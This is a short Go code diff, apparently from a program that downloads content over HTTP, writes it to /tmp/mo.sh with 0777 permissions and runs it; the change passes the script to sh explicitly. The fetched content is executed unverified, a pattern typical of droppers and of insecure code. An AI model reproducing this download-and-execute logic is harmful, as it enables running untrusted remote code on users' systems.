@@ -88,7 +88,7 @@ mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)
      ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
       
 
-        mo := exec.Command("/tmp/./mo.sh") 
+        mo := exec.Command("sh" , "/tmp/./mo.sh") 
 
         mo.Run()
 
